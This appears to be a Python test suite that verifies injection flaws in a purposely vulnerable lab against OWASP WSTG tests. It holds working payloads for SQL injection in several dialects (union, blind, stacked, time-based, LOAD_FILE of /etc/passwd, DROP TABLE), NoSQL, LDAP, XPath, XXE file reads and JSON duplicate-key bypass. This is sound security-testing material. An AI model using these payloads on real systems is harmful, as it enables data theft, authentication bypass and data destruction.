"""WSTG probes for machine 04 - Injection / Datastore.

Each probe asserts real injection impact (extracted secrets, bypassed auth,
disclosed entries), never merely a status code.

injt_05 exercises ALL eight SQL/NoSQL dialect sub-endpoints and reports
per-dialect results. 05.1 (Oracle) and 05.5 (MS Access) are faithful engine
substitutes (see manifest degraded note); 05.8 runs the shipped alasql page in
real headless Chromium via Playwright (lazy import; auto-installs the browser
on first use) and additionally asserts the server-side debug sink.
"""
import json
import subprocess
import sys
import time
import urllib.parse
import uuid

from labhttp import get, post

MYSQL_SECRET = "WSTG-M04{mysql_union_blind_stacked}"
PG_SECRET = "WSTG-M04{pg_concat_union_sleep}"
MSSQL_SECRET = "WSTG-M04{mssql_union_batch}"
ORA_SECRET = "WSTG-M04{plsql_gateway_injection}"
ACCESS_SECRET = "WSTG-M04{jet_facade_stacked}"
NOSQL_SECRET = "WSTG-M04{nosql_operator_and_where}"
ORM_SECRET = "WSTG-M04{orm_rawsql_orderby}"
CLIENT_SECRET = "WSTG-M04{client_side_alasql}"
LDAP_SECRET = "WSTG-M04{ldap_filter_injection}"
XXE_SECRET = "WSTG-M04{xml_entity_expansion}"
XPATH_SECRET = "WSTG-M04{xpath_auth_bypass}"
JSON_SECRET = "WSTG-M04{json_duplicate_key}"


def _u(ctx, path, **params):
    qs = urllib.parse.urlencode(params)
    return ctx.url(path) + ("?" + qs if qs else "")


def _chromium():
    """Lazy Playwright import; install the browser once if missing."""
    from playwright.sync_api import sync_playwright
    pw = sync_playwright().start()
    try:
        browser = pw.chromium.launch(headless=True)
    except Exception:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"],
                       check=True, capture_output=True, timeout=900)
        browser = pw.chromium.launch(headless=True)
    return pw, browser


# --- WSTG-INJT-05 (all dialects) -------------------------------------------

def _dialect_mysql(ctx):
    # UNION extraction of the seeded secret row
    r = get(_u(ctx, "/mysql/products", id="0 UNION SELECT 1,secret,3 FROM vault"))
    union_ok = r.status == 200 and MYSQL_SECRET in r.text
    # boolean-blind: identical page shape, condition-controlled row count
    cond = "(SELECT SUBSTRING(secret,1,9) FROM vault LIMIT 1)="
    t = get(_u(ctx, "/mysql/search", q="%' AND " + cond + "'WSTG-M04{' -- "))
    f = get(_u(ctx, "/mysql/search", q="%' AND " + cond + "'XXXXXXXXX' -- "))
    blind_ok = t.json().get("count", 0) > 0 and f.json().get("count", -1) == 0
    # stacked queries (idempotent: drops its own exfil table first)
    r = get(_u(ctx, "/mysql/stacked",
               id="0; DROP TABLE IF EXISTS exfil; "
                  "CREATE TABLE exfil AS SELECT secret FROM vault; "
                  "SELECT secret FROM exfil"))
    stacked_ok = r.status == 200 and MYSQL_SECRET in r.text
    # LOAD_FILE variant (secure_file_priv disabled, FILE granted)
    r = get(_u(ctx, "/mysql/file", id="0 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3"))
    file_ok = r.status == 200 and "root:" in r.text
    ok = union_ok and blind_ok and stacked_ok and file_ok
    return ok, f"union={union_ok} blind={blind_ok} stacked={stacked_ok} load_file={file_ok}"


def _dialect_pg(ctx):
    # || concatenation-context injection
    r = get(_u(ctx, "/pg/label", text="x' || (SELECT secret FROM vault LIMIT 1) || '"))
    concat_ok = r.status == 200 and PG_SECRET in r.text
    # classic UNION
    r = get(_u(ctx, "/pg/items", name="' UNION SELECT 1,secret FROM vault--"))
    union_ok = r.status == 200 and PG_SECRET in r.text
    # time-based pg_sleep
    base = get(_u(ctx, "/pg/slow", id="1")).json().get("elapsed_seconds", 99)
    slow = get(_u(ctx, "/pg/slow", id="1 AND (SELECT pg_sleep(3)) IS NULL"),
               timeout=30).json().get("elapsed_seconds", 0)
    time_ok = base < 2.0 and slow >= 2.5
    ok = concat_ok and union_ok and time_ok
    return ok, f"concat={concat_ok} union={union_ok} pg_sleep={slow}s(base {base}s)"


def _dialect_oracle(ctx):
    # mod_plsql gateway: /pls/<dad>/<package>.<proc>, dynamic SQL in package body
    r = get(_u(ctx, "/pls/lab/WEB_USERS.show", p_id="0 UNION SELECT 1,secret,'x' FROM ora_vault"))
    union_ok = r.status == 200 and ORA_SECRET in r.text and "plsql_block" in r.text
    r = get(_u(ctx, "/pls/lab/WEB_USERS.find", p_name="x' OR '1'='1"))
    bypass_ok = r.status == 200 and len(r.json().get("rows", [])) == 3
    ok = union_ok and bypass_ok
    return ok, f"gateway-union={union_ok} find-bypass={bypass_ok} (PG engine substitute)"


def _dialect_mssql(ctx):
    r = get(_u(ctx, "/mssql/products", id="0 UNION SELECT 1,secret,3 FROM vault"), timeout=60)
    if r.status == 503:
        return False, "mssql service not deployed"
    union_ok = r.status == 200 and MSSQL_SECRET in r.text
    r = get(_u(ctx, "/mssql/stacked", id="0; SELECT secret FROM vault"), timeout=60)
    batch_ok = r.status == 200 and MSSQL_SECRET in r.text
    slow = get(_u(ctx, "/mssql/slow", id="1; WAITFOR DELAY '00:00:03'"),
               timeout=60).json().get("elapsed_seconds", 0)
    time_ok = slow >= 2.5
    ok = union_ok and batch_ok and time_ok
    return ok, f"union={union_ok} batch={batch_ok} waitfor={slow}s"


def _dialect_access(ctx):
    # Jet stacked queries (';' separated, no comment syntax in Jet)
    r = get(_u(ctx, "/access/products",
               name="zzz'; SELECT secret FROM vault; SELECT * FROM products WHERE name LIKE '"))
    stacked_ok = r.status == 200 and ACCESS_SECRET in r.text
    # IIF() boolean-blind via Access '*' wildcards + MID()
    iif = "IIF((SELECT MID(secret,1,4) FROM vault)="
    t = get(_u(ctx, "/access/products", name="zzz*' OR " + iif + "'WSTG',1,0) OR 'a'='a"))
    f = get(_u(ctx, "/access/products", name="zzz*' OR " + iif + "'XXXX',1,0) OR 'a'='a"))
    nt = sum(len(s["rows"]) for s in t.json().get("statements", []))
    nf = sum(len(s["rows"]) for s in f.json().get("statements", []))
    blind_ok = nt > 0 and nf == 0
    # #date# literal handling
    d = get(_u(ctx, "/access/products", name="zzz' OR order_date>#2024-01-01# OR 'a'='a"))
    date_ok = d.status == 200 and sum(len(s["rows"]) for s in d.json().get("statements", [])) == 3
    ok = stacked_ok and blind_ok and date_ok
    return ok, f"stacked={stacked_ok} iif-blind={blind_ok} date-literal={date_ok} (SQLite engine)"


def _dialect_nosql(ctx):
    # operator injection via JSON body
    r = post(ctx.url("/nosql/login"), data={"user": "admin", "pass": {"$gt": ""}})
    op_ok = r.status == 200 and NOSQL_SECRET in r.text
    # operator injection via query-string bracket notation
    r = get(ctx.url("/nosql/login?user=admin&pass%5B%24gt%5D="))
    qs_ok = r.status == 200 and NOSQL_SECRET in r.text
    r = get(ctx.url("/nosql/login?user%5B%24gt%5D=&pass%5B%24gt%5D="))
    bypass_ok = r.status == 200 and r.json().get("authenticated") is True
    # $where server-side JavaScript injection
    r = get(_u(ctx, "/nosql/where", q="x' || (this.secret||'').indexOf('WSTG')===0 || '"))
    where_ok = r.status == 200 and NOSQL_SECRET in r.text
    ok = op_ok and qs_ok and bypass_ok and where_ok
    return ok, f"json-op={op_ok} bracket-qs={qs_ok} anon-bypass={bypass_ok} $where={where_ok}"


def _dialect_orm(ctx):
    # SQLAlchemy filter(text(...)) UNION extraction
    r = get(_u(ctx, "/orm/users", name="' UNION SELECT id,secret,'admin' FROM orm_vault--"))
    union_ok = r.status == 200 and ORM_SECRET in r.text
    # order_by(text(...)) boolean differential changes row order
    case = "(CASE WHEN (SELECT secret FROM orm_vault LIMIT 1) LIKE "
    t = get(_u(ctx, "/orm/users", sort=case + "'WSTG-M04{orm%' THEN username ELSE id::text END)"))
    f = get(_u(ctx, "/orm/users", sort=case + "'NOPE%' THEN username ELSE id::text END)"))
    rt, rf = t.json().get("rows", []), f.json().get("rows", [])
    sort_ok = bool(rt) and bool(rf) and rt[0]["username"] != rf[0]["username"] \
        and rt[0]["username"] == "alice"
    ok = union_ok and sort_ok
    return ok, f"filter-union={union_ok} order_by-differential={sort_ok}"


def _dialect_clientsql(ctx):
    # Real headless Chromium executes the shipped alasql page; the URL param is
    # concatenated into client-side SQL. Assert both the in-page debug object
    # and the server-side sink that received the executed statement + rows.
    pw, browser = _chromium()
    try:
        page = browser.new_page()
        token = "probe-" + uuid.uuid4().hex[:8]
        payload = "nobody' UNION SELECT secret,'x' FROM vault -- "
        page.goto(ctx.url("/clientsql/") + "?name=" + urllib.parse.quote(payload)
                  + "&token=" + token, timeout=30000)
        page.wait_for_function(
            "window.__sqlDebug && window.__sqlDebug.rows && window.__sqlDebug.rows.length > 0",
            timeout=20000)
        dbg = page.evaluate("window.__sqlDebug")
        dom_ok = CLIENT_SECRET in json.dumps(dbg["rows"]) and "UNION SELECT secret" in dbg["sql"]
        # baseline: honest input returns only the matching row, no secret
        page.goto(ctx.url("/clientsql/") + "?name=alice&token=" + token + "-base",
                  timeout=30000)
        page.wait_for_function("window.__sqlDebug && window.__sqlDebug.rows", timeout=20000)
        base = page.evaluate("window.__sqlDebug")
        base_ok = CLIENT_SECRET not in json.dumps(base["rows"]) and len(base["rows"]) == 1
        # server-side sink recorded the browser's executed statement
        sink = {}
        for _ in range(10):
            sink = get(ctx.url("/clientsql/sink?token=" + token)).json()
            if sink.get("sql"):
                break
            time.sleep(0.5)
        sink_ok = CLIENT_SECRET in json.dumps(sink.get("rows")) and "UNION" in sink.get("sql", "")
        ok = dom_ok and base_ok and sink_ok
        return ok, f"playwright alasql union={dom_ok} baseline={base_ok} server-sink={sink_ok}"
    finally:
        browser.close()
        pw.stop()


def injt_05(ctx):
    results = {}
    for name, fn in [
        ("05.2-mysql", _dialect_mysql),
        ("05.4-postgresql", _dialect_pg),
        ("05.1-oracle-gateway", _dialect_oracle),
        ("05.3-mssql", _dialect_mssql),
        ("05.5-msaccess-facade", _dialect_access),
        ("05.6-nosql", _dialect_nosql),
        ("05.7-orm", _dialect_orm),
        ("05.8-client-side", _dialect_clientsql),
    ]:
        try:
            ok, ev = fn(ctx)
        except Exception as e:
            ok, ev = False, f"{type(e).__name__}: {e}"
        results[name] = (ok, ev)
    ok = all(v[0] for v in results.values())
    ev = "; ".join(f"{k}:{'OK' if v[0] else 'FAIL[' + v[1] + ']'}" for k, v in results.items())
    return ok, ev


# --- WSTG-INJT-06 LDAP ------------------------------------------------------

def injt_06(ctx):
    base = get(_u(ctx, "/ldap/login", uid="alice", password="wrong"))
    baseline_ok = base.status == 200 and base.json().get("count") == 0
    inj = get(_u(ctx, "/ldap/login", uid="*)(uid=*))(|(uid=*", password="x"))
    j = inj.json()
    entries = j.get("entries", [])
    secret_ok = LDAP_SECRET in inj.text
    pw_ok = any("userPassword" in e.get("attributes", {}) for e in entries)
    enum = get(_u(ctx, "/ldap/login", uid="*", password="*")).json()
    enum_ok = enum.get("count", 0) >= 3
    ok = baseline_ok and inj.status == 200 and len(entries) >= 3 and secret_ok and pw_ok and enum_ok
    return ok, (f"baseline=0 entries; filter injection -> {len(entries)} entries, "
                f"secret={secret_ok}, passwords-disclosed={pw_ok}, wildcard-enum={enum.get('count')}")


# --- WSTG-INJT-07 XML -------------------------------------------------------

def injt_07(ctx):
    form = {"Content-Type": "application/x-www-form-urlencoded"}
    base = post(ctx.url("/xml/order"),
                data=urllib.parse.urlencode({"item": "Widget", "price": "100", "qty": "2"}),
                headers=form)
    base_ok = base.status == 200 and base.json().get("total") == 200.0
    inj = post(ctx.url("/xml/order"),
               data=urllib.parse.urlencode(
                   {"item": "Widget</item><price>0</price><item>x", "price": "100", "qty": "2"}),
               headers=form)
    j = inj.json()
    struct_ok = inj.status == 200 and j.get("total") == 0.0 and len(j.get("prices_seen", [])) == 2
    xxe = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
           '"file:///app/data/xxe-secret.txt">]><r>&xxe;</r>')
    xr = post(ctx.url("/xml/parse"), data=xxe, headers={"Content-Type": "application/xml"})
    xxe_ok = xr.status == 200 and XXE_SECRET in xr.text
    ok = base_ok and struct_ok and xxe_ok
    return ok, (f"total 200->0 via injected <price> (prices={j.get('prices_seen')}), "
                f"XXE file entity disclosed secret={xxe_ok}")


# --- WSTG-INJT-09 XPath -----------------------------------------------------

def injt_09(ctx):
    base = get(_u(ctx, "/xpath/login", **{"user": "admin", "pass": "wrong"}))
    baseline_ok = base.status == 401 and base.json().get("authenticated") is False
    inj = get(_u(ctx, "/xpath/login", **{"user": "' or '1'='1", "pass": "' or '1'='1"}))
    j = inj.json()
    users = j.get("users", [])
    admin = [u for u in users if u.get("login") == "admin"]
    ok = (baseline_ok and inj.status == 200 and j.get("authenticated") is True
          and j.get("matched", 0) >= 3 and bool(admin) and admin[0].get("secret") == XPATH_SECRET)
    return ok, (f"wrong creds=401; ' or '1'='1 -> matched={j.get('matched')} users, "
                f"admin secret extracted={bool(admin) and admin[0].get('secret') == XPATH_SECRET}")


# --- WSTG-INJT-26 JSON parser differentials ---------------------------------

def injt_26(ctx):
    front = ctx.url("jsonfront")
    hdr = {"Content-Type": "application/json"}
    # control 1: front (first-wins) rejects an explicit admin claim
    ctl = post(front + "/json/transfer", data='{"role":"admin","action":"read_secret"}', headers=hdr)
    ctl_ok = ctl.status == 403 and ctl.json().get("stage") == "front"
    # control 2: honest user request passes the front but the backend grants nothing
    ben = post(front + "/json/transfer", data='{"role":"user","action":"read_secret"}', headers=hdr)
    ben_ok = ben.status == 403 and ben.json().get("backend", {}).get("granted") is False
    # attack: duplicate key - front (first-wins) sees user, backend (last-wins) sees admin
    dup = '{"role":"user","role":"admin","action":"read_secret"}'
    atk = post(front + "/json/transfer", data=dup, headers=hdr)
    j = atk.json()
    diff_ok = (atk.status == 200 and j.get("front_seen_role") == "user"
               and j.get("backend", {}).get("seen_role") == "admin"
               and j.get("backend", {}).get("secret") == JSON_SECRET
               and j.get("backend", {}).get("granted") is True)
    # key-matching differential: unicode-escaped duplicate key
    esc = '{"role":"user","ro\\u006ce":"admin","action":"read_secret"}'
    er = post(front + "/json/transfer", data=esc, headers=hdr)
    esc_ok = er.status == 200 and JSON_SECRET in er.text
    # backend refuses direct access (only the front may call it)
    direct = post(ctx.url("/json/backend"), data=dup, headers=hdr)
    direct_ok = direct.status == 403
    ok = ctl_ok and ben_ok and diff_ok and esc_ok and direct_ok
    return ok, (f"admin-claim=403(front), honest-user=403(backend); duplicate-key: front=user "
                f"backend=admin granted secret={diff_ok}; escaped-key={esc_ok}; direct-backend=403={direct_ok}")